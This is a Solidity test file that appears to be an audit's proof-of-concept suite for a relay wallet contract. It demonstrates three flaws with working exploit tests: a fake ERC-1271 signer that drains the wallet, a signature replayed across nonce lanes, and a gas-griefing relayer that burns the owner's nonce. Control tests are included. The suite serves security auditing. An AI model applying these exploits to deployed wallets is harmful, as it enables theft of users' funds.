// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;
import {Proof} from "proof/Proof.sol";
import {RelayWallet} from "../src/RelayWallet.sol";
import {IERC1271} from "@openzeppelin/contracts/interfaces/IERC1271.sol";

// Any contract can answer "valid" for any hash.
contract AlwaysValid {
    function isValidSignature(bytes32, bytes memory) external pure returns (bytes4) {
        return IERC1271.isValidSignature.selector;
    }
}

// A call that needs a lot of gas: records 20 fresh storage slots.
contract Ledger {
    mapping(uint256 => uint256) public entries;
    uint256 public count;
    function record() external {
        for (uint256 i = 0; i < 20; i++) entries[i] = i + 1;
        count += 1;
    }
}

contract RelayWalletProof is Proof {
    uint256 aliceKey = 0xA11CE;
    address alice;
    address stranger = address(0xBAD);
    address bob = address(0xB0B);
    RelayWallet w;

    function setUp() public {
        alice = vm.addr(aliceKey);
        w = new RelayWallet(alice);
        vm.deal(address(w), 10 ether);
    }

    function _sign(uint256 n, address to, uint256 value, bytes memory data) internal returns (bytes memory) {
        bytes32 h = keccak256(abi.encode(block.chainid, address(w), n, to, value, data));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(aliceKey, h);
        return abi.encodePacked(r, s, v);
    }

    // Issue 1: the ERC-1271 branch trusts whatever contract the signature names; it never checks signer == owner.
    function test_issue1_anyContractSignerAuthorizesAnyCall() public {
        AlwaysValid yes = new AlwaysValid();
        vm.prank(stranger);
        w.exec(0, stranger, 10 ether, "", abi.encode(address(yes), bytes("")));
        assertEq(address(w).balance, 0, "wallet emptied");
        assertEq(stranger.balance, 10 ether, "stranger received the wallet's ETH with no owner signature");
    }

    // Issue 2: the lane is not in the signed hash, so a signature for nonce n is valid on every lane at nonce n.
    function test_issue2_signatureReplaysOnEveryOtherLane() public {
        bytes memory sig = _sign(0, bob, 1 ether, "");   // Alice signs one payment of 1 ETH to Bob
        w.exec(0, bob, 1 ether, "", sig);
        vm.startPrank(stranger);
        w.exec(1, bob, 1 ether, "", sig);
        w.exec(2, bob, 1 ether, "", sig);
        w.exec(3, bob, 1 ether, "", sig);
        vm.stopPrank();
        assertEq(bob.balance, 4 ether, "one signed payment ran four times");
    }

    // Issue 3: no signed gas amount and no gas check, so the relayer picks a gas limit at which the inner
    // call runs out of gas while exec still succeeds; the nonce is spent and the owner's call never ran.
    function test_issue3_relayerForcesInnerFailureAndBurnsNonce() public {
        Ledger ledger = new Ledger();
        bytes memory data = abi.encodeCall(Ledger.record, ());
        bytes memory sig = _sign(0, address(ledger), 0, data);
        bytes memory call = abi.encodeCall(RelayWallet.exec, (0, address(ledger), 0, data, sig));
        bool found;
        for (uint256 g = 30_000; g < 600_000; g += 1_000) {
            vm.prank(stranger);
            (bool ok,) = address(w).call{gas: g}(call);
            if (ok) { found = true; break; }
        }
        assertTrue(found, "some gas limit lets exec succeed");
        assertEq(w.nonces(0), 1, "nonce spent");
        assertEq(ledger.count(), 0, "but the owner's call did not run");
        vm.expectRevert();
        w.exec(0, address(ledger), 0, data, sig);          // the same signature cannot be used again
    }

    // Control for issue 3: with ample gas the same signed call runs.
    function test_control_ampleGasRunsTheCall() public {
        Ledger ledger = new Ledger();
        bytes memory data = abi.encodeCall(Ledger.record, ());
        w.exec(0, address(ledger), 0, data, _sign(0, address(ledger), 0, data));
        assertEq(ledger.count(), 1, "call ran");
    }

    // Control for issues 1 and 2: an EOA signature from anyone but the owner is rejected.
    function test_control_strangerEoaSignatureRejected() public {
        bytes32 h = keccak256(abi.encode(block.chainid, address(w), uint256(0), stranger, 1 ether, bytes("")));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(0xBAD, h);
        vm.expectRevert(bytes("bad signature"));
        w.exec(0, stranger, 1 ether, "", abi.encodePacked(r, s, v));
    }
}
